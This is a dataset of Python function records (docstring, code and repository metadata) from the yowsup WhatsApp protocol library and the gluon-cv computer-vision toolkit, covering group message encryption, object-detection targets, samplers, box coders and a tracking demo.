self._sendIq(groupInfoIq, sendToGroup)\nelse:\n    logger.debug(\"We have a senderKeyRecord\")\n    retryCount = 0\n    jidsNeedSenderKey = []\n    if retryReceiptEntity is not None:\n        retryCount = retryReceiptEntity.getRetryCount()\n        jidsNeedSenderKey.append(retryReceiptEntity.getRetryJid())\n    self.sendToGroupWithSessions(node, jidsNeedSenderKey, retryCount)", "path": "yowsup/yowsup/layers/axolotl/layer_send.py", "commit_date": "2019-05-31 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\nFor each jid in jidsNeedSenderKey will create a pkmsg enc node with the associated jid.\nIf retryCount > 0 and we have only one jidsNeedSenderKey, this is a retry requested by a specific participant\nand this message is to be directed at specific at that participant indicated by jidsNeedSenderKey[0]. In this\ncase the participant's jid would go in the parent's EncryptedMessage and not into the enc node.\n\"\"\"\n", "func_signal": "def sendToGroupWithSessions(self, node, jidsNeedSenderKey = None, retryCount=0):\n", "code": "logger.debug(\n    \"sendToGroupWithSessions(node=[omitted], jidsNeedSenderKey=%s, retryCount=%d)\" % (jidsNeedSenderKey, retryCount)\n)\njidsNeedSenderKey = jidsNeedSenderKey or []\ngroupJid = node[\"to\"]\nprotoNode = node.getChild(\"proto\")\nencEntities = []\nparticipant = jidsNeedSenderKey[0] if len(jidsNeedSenderKey) == 1 and retryCount > 0 else None\nif len(jidsNeedSenderKey):\n    senderKeyDistributionMessage = self.manager.group_create_skmsg(groupJid)\n    for jid in jidsNeedSenderKey:\n        message =  self.serializeSenderKeyDistributionMessageToProtobuf(node[\"to\"], senderKeyDistributionMessage)\n        if retryCount > 0:\n            message.MergeFromString(protoNode.getData())\n        ciphertext = self.manager.encrypt(jid.split('@')[0], message.SerializeToString())\n        encEntities.append(\n            EncProtocolEntity(\n                    EncProtocolEntity.TYPE_MSG if ciphertext.__class__ == WhisperMessage else EncProtocolEntity.TYPE_PKMSG\n                , 2, ciphertext.serialize(), protoNode[\"mediatype\"],  jid=None if participant else jid\n            )\n        )\n\nif not retryCount:\n    messageData = protoNode.getData()\n    ciphertext = self.manager.group_encrypt(groupJid, messageData)\n    mediaType = protoNode[\"mediatype\"]\n\n    encEntities.append(EncProtocolEntity(EncProtocolEntity.TYPE_SKMSG, 2, ciphertext, mediaType))\n\nself.sendEncEntities(node, encEntities, participant)", "path": "yowsup/yowsup/layers/axolotl/layer_send.py", "commit_date": "2019-05-31 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "# type: (Exception) -> None\n", "func_signal": "def on_handshake_finished(self, e=None):\n", "code": "if e is not None:\n    self.emitEvent(YowLayerEvent(self.EVENT_HANDSHAKE_FAILED, reason=e))\n    data=WriteEncoder(TokenDictionary()).protocolTreeNodeToBytes(\n        ProtocolTreeNode(\"failure\", {\"reason\": str(e)})\n    )\n    self.toUpper(data)\n    logger.error(\"An error occurred during handshake, try login again.\")", "path": "yowsup/yowsup/layers/noise/layer.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n{\n    \"keystore\": serializer\n}\n:param serialize_map:\n:type serialize_map:\n\"\"\"\n", "func_signal": "def __init__(self, serialize_map):\n", "code": "transform_map = {}\nreverse_map = {}\nfor key, val in serialize_map:\n    transform_map[key] = lambda key, val: key, serialize_map[key].serialize(val)\n    reverse_map[key] = lambda key, val: key, serialize_map[key].deserialize(val)\n\nsuper(SerializeTransform, self).__init__(transform_map=transform_map, reverse_map=reverse_map)", "path": "yowsup/yowsup/config/transforms/serialize.py", "commit_date": "2019-04-23 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "# axolotlIface = self.getLayerInterface(YowAxolotlLayer)\n# if axolotlIface:\n#     axolotlIface.encryptMedia(builder)\n\n", "func_signal": "def _sendMediaMessage(self, builder, success, error=None, progress=None):\n", "code": "iq = RequestUploadIqProtocolEntity(\n    builder.mediaType, filePath=builder.getFilepath(), encrypted=builder.isEncrypted())\n\ndef successFn(resultEntity, requestUploadEntity): return self.__onRequestUploadSuccess(\n    resultEntity, requestUploadEntity, builder, success, error, progress)\n\ndef errorFn(errorEntity, requestUploadEntity): return self.__onRequestUploadError(\n    errorEntity, requestUploadEntity, error)\nself._sendIq(iq, successFn, errorFn)", "path": "yowsup/yowsup/layers/interface/interface.py", "commit_date": "2019-04-23 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:param data:\n:type data: bytearray | bytes\n:return:\n:rtype:\n\"\"\"\n", "func_signal": "def send(self, data):\n", "code": "data = bytes(data) if type(data) is not bytes else data\nself._wa_noiseprotocol.send(data)", "path": "yowsup/yowsup/layers/noise/layer.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "# type: (str, dict, list[ProtocolTreeNode], bytes) -> None\n", "func_signal": "def __init__(self, tag, attributes = None, children = None, data = None):\n", "code": "if data is not None:\n    assert type(data) is bytes, type(data)\n\nself.tag = tag\nself.attributes = attributes or {}\nself.children = children or []\nself.data = data\nself._truncate_str_data = True\n\nassert type(self.children) is list, \"Children must be a list, got %s\" % type(self.children)", "path": "yowsup/yowsup/structs/protocoltreenode.py", "commit_date": "2019-06-09 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "# type: (StickerAttributes, MessageMetaAttributes) -> None\n", "func_signal": "def __init__(self, sticker_attrs, message_meta_attrs):\n", "code": "super(StickerDownloadableMediaMessageProtocolEntity, self).__init__(\n    \"sticker\", MessageAttributes(sticker=sticker_attrs),  message_meta_attrs\n)", "path": "yowsup/yowsup/layers/protocol_media/protocolentities/message_media_downloadable_sticker.py", "commit_date": "2019-05-29 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"Reset class categories and class predictors.\n\nParameters\n----------\nclasses : iterable of str\n    The new categories. ['apple', 'orange'] for example.\nreuse_weights : dict\n    A {new_integer : old_integer} or mapping dict or {new_name : old_name} mapping dict,\n    or a list of [name0, name1,...] if class names don't change.\n    This allows the new predictor to reuse the\n    previously trained weights specified.\n\n\"\"\"\n", "func_signal": "def reset_class(self, classes, reuse_weights=None):\n", "code": "self._clear_cached_op()\nif reuse_weights:\n    assert hasattr(self, 'classes'), \"require old classes to reuse weights\"\nold_classes = getattr(self, 'classes', [])\nself.classes = classes\nself.num_class = len(classes)\nif isinstance(reuse_weights, (dict, list)):\n    if isinstance(reuse_weights, dict):\n        # trying to replace str with indices\n        for k, v in reuse_weights.items():\n            if isinstance(v, str):\n                try:\n                    v = old_classes.index(v)  # raise ValueError if not found\n                except ValueError:\n                    raise ValueError(\n                        \"{} not found in old class names {}\".format(v, old_classes))\n                reuse_weights[k] = v\n            if isinstance(k, str):\n                try:\n                    new_idx = self.classes.index(k)  # raise ValueError if not found\n                except ValueError:\n                    raise ValueError(\n                        \"{} not found in new class names {}\".format(k, self.classes))\n                reuse_weights.pop(k)\n                reuse_weights[new_idx] = v\n    else:\n        new_map = {}\n        for x in reuse_weights:\n            try:\n                new_idx = self.classes.index(x)\n                old_idx = old_classes.index(x)\n                new_map[new_idx] = old_idx\n            except ValueError:\n                warnings.warn(\"{} not found in old: {} or new class names: {}\".format(\n                    x, old_classes, self.classes))\n        reuse_weights = new_map\n\nwith self.name_scope():\n    old_class_pred = self.class_predictor\n    old_box_pred = self.box_predictor\n    ctx = list(old_class_pred.params.values())[0].list_ctx()\n    # to avoid deferred init, number of in_channels must be defined\n    in_units = list(old_class_pred.params.values())[0].shape[1]\n    self.class_predictor = nn.Dense(\n        self.num_class + 1, weight_initializer=mx.init.Normal(0.01),\n        prefix=self.class_predictor.prefix, in_units=in_units)\n    self.box_predictor = nn.Dense(\n        self.num_class * 4, weight_initializer=mx.init.Normal(0.001),\n        prefix=self.box_predictor.prefix, in_units=in_units)\n    self.cls_decoder = MultiPerClassDecoder(num_class=self.num_class + 1)\n    # initialize\n    self.class_predictor.initialize(ctx=ctx)\n    self.box_predictor.initialize(ctx=ctx)\n    if reuse_weights:\n        assert isinstance(reuse_weights, dict)\n        # class predictors\n        srcs = (old_class_pred, old_box_pred)\n        dsts = (self.class_predictor, self.box_predictor)\n        offsets = (1, 0)  # class predictor has bg, box don't\n        lens = (1, 4)  # class predictor length=1, box length=4\n        for src, dst, offset, l in zip(srcs, dsts, offsets, lens):\n            for old_params, new_params in zip(src.params.values(),\n                                              dst.params.values()):\n                # slice and copy weights\n                old_data = old_params.data()\n                new_data = new_params.data()\n\n                for k, v in reuse_weights.items():\n                    if k >= len(self.classes) or v >= len(old_classes):\n                        warnings.warn(\"reuse mapping {}/{} -> {}/{} out of range\".format(\n                            k, self.classes, v, old_classes))\n                        continue\n                    new_data[(k + offset) * l:(k + offset + 1) * l] = \\\n                        old_data[(v + offset) * l:(v + offset + 1) * l]\n                # reuse background weights as well\n                if offset > 0:\n                    new_data[0:l] = old_data[0:l]\n                # set data to new conv layers\n                new_params.set_data(new_data)", "path": "gluon-cv/gluoncv/model_zoo/rcnn/rcnn.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Short summary.\n\nParameters\n----------\nF : mxnet.nd or mxnet.sym\n    `F` is mxnet.sym if hybridized or mxnet.nd if not.\nbox_preds : mxnet.nd.NDArray\n    Predicted bounding boxes.\ngt_boxes : mxnet.nd.NDArray\n    Ground-truth bounding boxes.\nobj_t : mxnet.nd.NDArray\n    Prefetched Objectness targets.\ncenters_t : mxnet.nd.NDArray\n    Prefetched regression target for center x and y.\nscales_t : mxnet.nd.NDArray\n    Prefetched regression target for scale x and y.\nweights_t : mxnet.nd.NDArray\n    Prefetched element-wise gradient weights for center_targets and scale_targets.\nclas_t : mxnet.nd.NDArray\n    Prefetched one-hot vector for classification.\n\nReturns\n-------\n(tuple of) mxnet.nd.NDArray\n    objectness: 0 for negative, 1 for positive, -1 for ignore.\n    center_targets: regression target for center x and y.\n    scale_targets: regression target for scale x and y.\n    weights: element-wise gradient weights for center_targets and scale_targets.\n    class_targets: a one-hot vector for classification.\n\n\"\"\"\n", "func_signal": "def hybrid_forward(self, F, box_preds, gt_boxes, obj_t, centers_t, scales_t, weights_t, clas_t):\n", "code": "with autograd.pause():\n    dynamic_t = self._dynamic_target(box_preds, gt_boxes)\n    # use fixed target to override dynamic targets\n    obj, centers, scales, weights, clas = zip(\n        dynamic_t, [obj_t, centers_t, scales_t, weights_t, clas_t])\n    mask = obj[1] > 0\n    objectness = F.where(mask, obj[1], obj[0])\n    mask2 = mask.tile(reps=(2,))\n    center_targets = F.where(mask2, centers[1], centers[0])\n    scale_targets = F.where(mask2, scales[1], scales[0])\n    weights = F.where(mask2, weights[1], weights[0])\n    mask3 = mask.tile(reps=(self._num_class,))\n    class_targets = F.where(mask3, clas[1], clas[0])\n    smooth_weight = 1. / self._num_class\n    if self._label_smooth:\n        smooth_weight = min(1. / self._num_class, 1. / 40)\n        class_targets = F.where(\n            class_targets > 0.5, class_targets - smooth_weight, class_targets)\n        class_targets = F.where(\n            (class_targets < -0.5) + (class_targets > 0.5),\n            class_targets, F.ones_like(class_targets) * smooth_weight)\n    class_mask = mask.tile(reps=(self._num_class,)) * (class_targets >= 0)\n    return [F.stop_gradient(x) for x in [objectness, center_targets, scale_targets,\n                                         weights, class_targets, class_mask]]", "path": "gluon-cv/gluoncv/model_zoo/yolo/yolo_target.py", "commit_date": "2019-04-18 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Quota Sampler\n\nParameters:\n----------\nmatches : NDArray or Symbol\n    Matching results, positive number for positive matching, -1 for not matched.\nious : NDArray or Symbol\n    IOU overlaps with shape (N, M), batching is supported.\n\nReturns:\n--------\nNDArray or Symbol\n    Sampling results with same shape as ``matches``.\n    1 for positive, -1 for negative, 0 for ignore.\n\n\"\"\"\n", "func_signal": "def forward(self, matches, ious):\n", "code": "F = mx.nd\nmax_pos = int(round(self._pos_ratio * self._num_sample))\nmax_neg = int(self._neg_ratio * self._num_sample)\nresults = []\nfor i in range(matches.shape[0]):\n    # init with 0s, which are ignored\n    result = F.zeros_like(matches[0])\n    # positive samples\n    ious_max = ious.max(axis=-1)[i]\n    result = F.where(matches[i] >= 0, F.ones_like(result), result)\n    result = F.where(ious_max >= self._pos_thresh, F.ones_like(result), result)\n    # negative samples with label -1\n    neg_mask = ious_max < self._neg_thresh_high\n    neg_mask = neg_mask * (ious_max >= self._neg_thresh_low)\n    result = F.where(neg_mask, F.ones_like(result) * -1, result)\n\n    # re-balance if number of positive or negative exceed limits\n    result = result.asnumpy()\n    num_pos = int((result > 0).sum())\n    if num_pos > max_pos:\n        disable_indices = np.random.choice(\n            np.where(result > 0)[0], size=(num_pos - max_pos), replace=False)\n        result[disable_indices] = 0  # use 0 to ignore\n    num_neg = int((result < 0).sum())\n    if self._fill_negative:\n        # if pos_sample is less than quota, we can have negative samples filling the gap\n        max_neg = max(self._num_sample - min(num_pos, max_pos), max_neg)\n    if num_neg > max_neg:\n        disable_indices = np.random.choice(\n            np.where(result < 0)[0], size=(num_neg - max_neg), replace=False)\n        result[disable_indices] = 0\n    results.append(mx.nd.array(result))\n\nreturn mx.nd.stack(*results, axis=0)", "path": "gluon-cv/gluoncv/nn/sampler.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Forward of decoder\"\"\"\n", "func_signal": "def hybrid_forward(self, F, x, wh, reg):\n", "code": "_, _, out_h, out_w = x.shape_array().split(num_outputs=4, axis=0)\nscores, indices = x.reshape((0, -1)).topk(k=self._topk, ret_typ='both')\nindices = F.cast(indices, 'int64')\ntopk_classes = F.cast(F.broadcast_div(indices, (out_h * out_w)), 'float32')\ntopk_indices = F.broadcast_mod(indices, (out_h * out_w))\ntopk_ys = F.broadcast_div(topk_indices, out_w)\ntopk_xs = F.broadcast_mod(topk_indices, out_w)\ncenter = reg.transpose((0, 2, 3, 1)).reshape((0, -1, 2))\nwh = wh.transpose((0, 2, 3, 1)).reshape((0, -1, 2))\nbatch_indices = F.cast(F.arange(256).slice_like(\n    center, axes=(0)).expand_dims(-1).tile(reps=(1, self._topk)), 'int64')\nreg_xs_indices = F.zeros_like(batch_indices, dtype='int64')\nreg_ys_indices = F.ones_like(batch_indices, dtype='int64')\nreg_xs = F.concat(batch_indices, topk_indices, reg_xs_indices, dim=0).reshape((3, -1))\nreg_ys = F.concat(batch_indices, topk_indices, reg_ys_indices, dim=0).reshape((3, -1))\nxs = F.cast(F.gather_nd(center, reg_xs).reshape((-1, self._topk)), 'float32')\nys = F.cast(F.gather_nd(center, reg_ys).reshape((-1, self._topk)), 'float32')\ntopk_xs = F.cast(topk_xs, 'float32') + xs\ntopk_ys = F.cast(topk_ys, 'float32') + ys\nw = F.cast(F.gather_nd(wh, reg_xs).reshape((-1, self._topk)), 'float32')\nh = F.cast(F.gather_nd(wh, reg_ys).reshape((-1, self._topk)), 'float32')\nhalf_w = w / 2\nhalf_h = h / 2\nresults = [topk_xs - half_w, topk_ys - half_h, topk_xs + half_w, topk_ys + half_h]\nresults = F.concat(*[tmp.expand_dims(-1) for tmp in results], dim=-1)\nreturn topk_classes, scores, results * self._scale", "path": "gluon-cv/gluoncv/nn/coder.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Encode BBox One entry per category\n\nParameters\n----------\nsamples: (B, N) value +1 (positive), -1 (negative), 0 (ignore)\nmatches: (B, N) value range [0, M)\nanchors: (B, N, 4) encoded in corner\nlabels: (B, N) value range [0, self._num_class), excluding background\nrefs: (B, M, 4) encoded in corner\n\nReturns\n-------\ntargets: (B, N_pos, C, 4) transform anchors to refs picked according to matches\nmasks: (B, N_pos, C, 4) only positive anchors of the correct class has targets\nindices : (B, N_pos) positive sample indices\n\n\"\"\"\n# refs [B, M, 4], anchors [B, N, 4], samples [B, N], matches [B, N]\n# encoded targets [B, N, 4], masks [B, N, 4]\n", "func_signal": "def hybrid_forward(self, F, samples, matches, anchors, labels, refs, means=None, stds=None):\n", "code": "if 'box_encode' in F.contrib.__dict__:\n    targets, masks = F.contrib.box_encode(samples, matches, anchors, refs, means, stds)\nelse:\n    targets, masks = self.class_agnostic_encoder(samples, matches, anchors, refs)\n\n# labels [B, M] -> [B, N, M]\nref_labels = F.broadcast_like(labels.reshape((0, 1, -1)), matches, lhs_axes=1, rhs_axes=1)\n# labels [B, N, M] -> pick from matches [B, N] -> [B, N, 1]\nref_labels = F.pick(ref_labels, matches, axis=2).reshape((0, -1)).expand_dims(2)\n# boolean array [B, N, C]\nsame_cids = F.broadcast_equal(ref_labels, F.reshape(F.arange(self._num_class),\n                                                    shape=(1, 1, -1)))\n\n# reduce box targets to positive samples only\nindices = F.slice_axis(\n    F.reshape(F.argsort(F.slice_axis(masks, axis=-1, begin=0, end=1), axis=1,\n                        is_ascend=False), (self._batch_size, -1)),\n    axis=1, begin=0, end=self._max_pos)\ntargets_tmp = []\nmasks_tmp = []\nsame_cids_tmp = []\nfor i in range(self._batch_size):\n    ind = F.slice_axis(indices, axis=0, begin=i, end=i + 1).squeeze(axis=0)\n    target = F.slice_axis(targets, axis=0, begin=i, end=i + 1).squeeze(axis=0)\n    mask = F.slice_axis(masks, axis=0, begin=i, end=i + 1).squeeze(axis=0)\n    same_cid = F.slice_axis(same_cids, axis=0, begin=i, end=i + 1).squeeze(axis=0)\n    targets_tmp.append(F.take(target, ind).expand_dims(axis=0))\n    masks_tmp.append(F.take(mask, ind).expand_dims(axis=0))\n    same_cids_tmp.append(F.take(same_cid, ind).expand_dims(axis=0))\ntargets = F.concat(*targets_tmp, dim=0)\nmasks = F.concat(*masks_tmp, dim=0)\nsame_cids = F.concat(*same_cids_tmp, dim=0).expand_dims(3)\n\n# targets, masks [B, N_pos, C, 4]\nall_targets = F.broadcast_axes(targets.expand_dims(2), axis=2, size=self._num_class)\nall_masks = F.broadcast_mul(masks.expand_dims(2),\n                            F.broadcast_axes(same_cids, axis=3, size=4))\nreturn all_targets, all_masks, indices", "path": "gluon-cv/gluoncv/nn/coder.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\" benchmark test.\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='make ovject tracking.')\nparser.add_argument('--data-dir', type=str, default='',\n                    help='if video-loader set to True, data-dir store videos frames.')\nparser.add_argument('--video-loader', action='store_true', default=True,\n                    help='if set to True, read videos directly instead of reading frames.')\nparser.add_argument('--video-path',\n                    default=\n                    'https://raw.githubusercontent.com/dmlc/web-data/master/gluoncv/tracking/Coke.mp4',\n                    help='if set to True, read videos directly instead of reading frames.')\nparser.add_argument('--netwrok', type=str, default='siamrpn_alexnet_v2_otb15',\n                    help='SiamRPN network name')\nparser.add_argument('--gt-bbox', type=int, nargs='+', default=[298, 160, 48, 80],\n                    help='first frame object location')\nparser.add_argument('--save-dir', type=str, default='./predictions',\n                    help='directory of saved results')\nopt = parser.parse_args()\nreturn opt", "path": "gluon-cv/scripts/tracking/siamrpn/demo.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Short summary.\n\nParameters\n----------\nF : mxnet.nd or mxnet.sym\n    `F` is mxnet.sym if hybridized or mxnet.nd if not.\nbox_preds : mxnet.nd.NDArray\n    Predicted bounding boxes.\ngt_boxes : mxnet.nd.NDArray\n    Ground-truth bounding boxes.\n\nReturns\n-------\n(tuple of) mxnet.nd.NDArray\n    objectness: 0 for negative, 1 for positive, -1 for ignore.\n    center_targets: regression target for center x and y.\n    scale_targets: regression target for scale x and y.\n    weights: element-wise gradient weights for center_targets and scale_targets.\n    class_targets: a one-hot vector for classification.\n\n\"\"\"\n", "func_signal": "def hybrid_forward(self, F, box_preds, gt_boxes):\n", "code": "with autograd.pause():\n    box_preds = box_preds.reshape((0, -1, 4))\n    objness_t = F.zeros_like(box_preds.slice_axis(axis=-1, begin=0, end=1))\n    center_t = F.zeros_like(box_preds.slice_axis(axis=-1, begin=0, end=2))\n    scale_t = F.zeros_like(box_preds.slice_axis(axis=-1, begin=0, end=2))\n    weight_t = F.zeros_like(box_preds.slice_axis(axis=-1, begin=0, end=2))\n    class_t = F.ones_like(objness_t.tile(reps=(self._num_class))) * -1\n    batch_ious = self._batch_iou(box_preds, gt_boxes)  # (B, N, M)\n    ious_max = batch_ious.max(axis=-1, keepdims=True)  # (B, N, 1)\n    objness_t = (ious_max > self._ignore_iou_thresh) * -1  # use -1 for ignored\nreturn objness_t, center_t, scale_t, weight_t, class_t", "path": "gluon-cv/gluoncv/model_zoo/yolo/yolo_target.py", "commit_date": "2019-04-18 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"since some stages won't see partial anchors, so we have to slice the correct targets\"\"\"\n# x with shape (B, N, A, 1 or 2)\n", "func_signal": "def _slice(self, x, num_anchors, num_offsets):\n", "code": "anchors = [0] + num_anchors.tolist()\noffsets = [0] + num_offsets.tolist()\nret = []\nfor i in range(len(num_anchors)):\n    y = x[:, offsets[i]:offsets[i+1], anchors[i]:anchors[i+1], :]\n    ret.append(y.reshape((0, -3, -1)))\nreturn nd.concat(*ret, dim=1)", "path": "gluon-cv/gluoncv/model_zoo/yolo/yolo_target.py", "commit_date": "2019-04-18 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"\nPredict with a SiamRPN and make inference\n--------------------\n\nthis function returns a dictionaries result. which has two keys. one is bbox,\nwhich represents the coordinates of the predicted frame,\nthe other is best_score, which records everyframe best_score.\nSave output in current path\n\"\"\"\n", "func_signal": "def inference(video_frames, tracker, opt):\n", "code": "scores = []\npred_bboxes = []\ngt_bbox = list(map(int, opt.gt_bbox))\nif not os.path.exists(opt.save_dir):\n    os.makedirs(opt.save_dir)\nfor ind, frame in enumerate(video_frames):\n    if ind == 0:\n        cx, cy, w, h = get_axis_aligned_bbox(np.array(gt_bbox))\n        gt_bbox_ = [cx-(w-1)/2, cy-(h-1)/2, w, h]\n        tracker.init(frame, gt_bbox_, ctx=mx.cpu())\n        pred_bbox = gt_bbox_\n        scores.append(None)\n        pred_bboxes.append(pred_bbox)\n    else:\n        outputs = tracker.track(frame, ctx=mx.cpu())\n        pred_bbox = outputs['bbox']\n        pred_bboxes.append(pred_bbox)\n        scores.append(outputs['best_score'])\n    pred_bbox = list(map(int, pred_bbox))\n    cv2.rectangle(frame, (pred_bbox[0], pred_bbox[1]),\n                  (pred_bbox[0]+pred_bbox[2], pred_bbox[1]+pred_bbox[3]),\n                  (0, 255, 255), 3)\n    cv2.imwrite(os.path.join(opt.save_dir, '%04d.jpg'%(ind+1)), frame)", "path": "gluon-cv/scripts/tracking/siamrpn/demo.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Hybrid forward\"\"\"\n", "func_signal": "def hybrid_forward(self, F, x):\n", "code": "marker = F.ones_like(x)\ny = F.where(x >= 0, marker, marker * -1)\nreturn y", "path": "gluon-cv/gluoncv/nn/sampler.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"HybridBlock, handle multi batch correctly\n\nParameters\n----------\nsamples: (B, N), value +1 (positive), -1 (negative), 0 (ignore)\nmatches: (B, N), value range [0, M)\nrefs: (B, M), value range [0, num_fg_class), excluding background\n\nReturns\n-------\ntargets: (B, N), value range [0, num_fg_class + 1), including background\n\n\"\"\"\n# samples (B, N) (+1, -1, 0: ignore), matches (B, N) [0, M), refs (B, M)\n# reshape refs (B, M) -> (B, 1, M) -> (B, N, M)\n", "func_signal": "def hybrid_forward(self, F, samples, matches, refs):\n", "code": "refs = F.broadcast_like(F.reshape(refs, (0, 1, -1)), matches, lhs_axes=1, rhs_axes=1)\n# ids (B, N, M) -> (B, N), value [0, M + 1), 0 reserved for background class\ntarget_ids = F.pick(refs, matches, axis=2) + 1\n# samples 0: set ignore samples to ignore_label\ntargets = F.where(samples > 0.5, target_ids, F.ones_like(target_ids) * self._ignore_label)\n# samples -1: set negative samples to 0\ntargets = F.where(samples < -0.5, F.zeros_like(targets), targets)\nreturn targets", "path": "gluon-cv/gluoncv/nn/coder.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"Quota Sampler\n\nParameters:\n----------\nin_data: array-like of Symbol\n    [matches, ious], see below.\nmatches : NDArray or Symbol\n    Matching results, positive number for positive matching, -1 for not matched.\nious : NDArray or Symbol\n    IOU overlaps with shape (N, M), batching is supported.\n\nReturns:\n--------\nNDArray or Symbol\n    Sampling results with same shape as ``matches``.\n    1 for positive, -1 for negative, 0 for ignore.\n\n\"\"\"\n", "func_signal": "def forward(self, is_train, req, in_data, out_data, aux):\n", "code": "matches = in_data[0]\nious = in_data[1]\nF = mx.nd\nmax_pos = int(round(self._pos_ratio * self._num_sample))\nmax_neg = int(self._neg_ratio * self._num_sample)\nfor i in range(matches.shape[0]):\n    # init with 0s, which are ignored\n    result = F.zeros_like(matches[i])\n    # negative samples with label -1\n    ious_max = ious.max(axis=-1)[i]\n    neg_mask = ious_max < self._neg_thresh_high\n    neg_mask = neg_mask * (ious_max >= self._neg_thresh_low)\n    result = F.where(neg_mask, F.ones_like(result) * -1, result)\n    # positive samples\n    result = F.where(matches[i] >= 0, F.ones_like(result), result)\n    result = F.where(ious_max >= self._pos_thresh, F.ones_like(result), result)\n\n    # re-balance if number of positive or negative exceed limits\n    result = result.asnumpy()\n    num_pos = int((result > 0).sum())\n    if num_pos > max_pos:\n        disable_indices = np.random.choice(\n            np.where(result > 0)[0], size=(num_pos - max_pos), replace=False)\n        result[disable_indices] = 0  # use 0 to ignore\n    num_neg = int((result < 0).sum())\n    if self._fill_negative:\n        # if pos_sample is less than quota, we can have negative samples filling the gap\n        max_neg = max(self._num_sample - min(num_pos, max_pos), max_neg)\n    if num_neg > max_neg:\n        disable_indices = np.random.choice(\n            np.where(result < 0)[0], size=(num_neg - max_neg), replace=False)\n        result[disable_indices] = 0  # use 0 to ignore\n\n    self.assign(out_data[0][i], req[0], mx.nd.array(result))", "path": "gluon-cv/gluoncv/nn/sampler.py", "commit_date": "2020-11-02 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "# pylint: disable=missing-function-docstring\n", "func_signal": "def hybrid_forward(self, F, M):\n", "code": "if self.norm == 'softmax':\n    Z = self.softmax(M)\nelif self.norm == 'sum':\n    norm = F.sum(M, axis=self.axis, keepdims=True)\n    Z = F.broadcast_div(M, norm)\nelse:\n    Z = M\nx = F.linspace(self.wfirst, self.wlast, self.size[0]).expand_dims(0)\ny = F.linspace(self.hfirst, self.hlast, self.size[1]).expand_dims(0).transpose()\noutput_x = F.sum(F.broadcast_mul(Z, x), axis=self.axis)\noutput_y = F.sum(F.broadcast_mul(Z, y), axis=self.axis)\nres = F.stack(output_x, output_y, axis=2)\nreturn res, Z", "path": "gluon-cv/gluoncv/nn/block.py", "commit_date": "2020-11-16 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
{"docstring": "\"\"\"\nTries to round all floats in obj in order to reduce json size.\nndigits is the default number of digits to round to,\nkey_ndigits allows you to override this for specific dictionary keys,\nthough there is no concept of nested keys.\nIt converts numpy arrays and iterables to lists,\nso it should only be used when serializing to json\n\"\"\"\n", "func_signal": "def round_floats_for_json(obj, ndigits=2, key_ndigits=None):\n", "code": "if key_ndigits is None:\n    key_ndigits = {}\n\nif isinstance(obj, np.floating):\n    obj = float(obj)\nelif isinstance(obj, np.ndarray):\n    obj = obj.tolist()\n\nif isinstance(obj, float):\n    obj = round(obj, ndigits)\nelif isinstance(obj, dict):\n    new_obj = {}\n    for k, v in obj.items():\n        this_ndigits = key_ndigits.get(k, ndigits)\n        new_obj[k] = round_floats_for_json(v, this_ndigits, key_ndigits)\n    return new_obj\nelif isinstance(obj, str):\n    return obj\nelse:\n    try:\n        return [round_floats_for_json(x, ndigits, key_ndigits) for x in obj]\n    except TypeError:\n        pass\n\nreturn obj", "path": "gluon-cv/gluoncv/torch/data/gluoncv_motion_dataset/utils/serialization_utils.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "dmlc/gluon-cv", "stars": 5727, "license": "apache-2.0", "language": "python", "size": 39687}
